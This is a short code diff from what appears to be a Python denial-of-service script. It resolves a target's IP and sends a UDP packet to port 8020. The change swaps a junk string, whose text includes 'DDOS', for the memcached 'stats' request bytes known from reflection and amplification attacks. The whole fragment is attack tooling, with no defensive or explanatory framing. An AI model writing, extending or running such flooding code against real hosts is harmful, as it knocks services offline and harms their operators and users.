@@ -25,7 +25,7 @@ target.replace("www.","")
 ip = socket.gethostbyname(target)
 
 port = 8020
-joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"
+joker = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.sendto(bytes(joker,"UTF-8"), (ip,port))
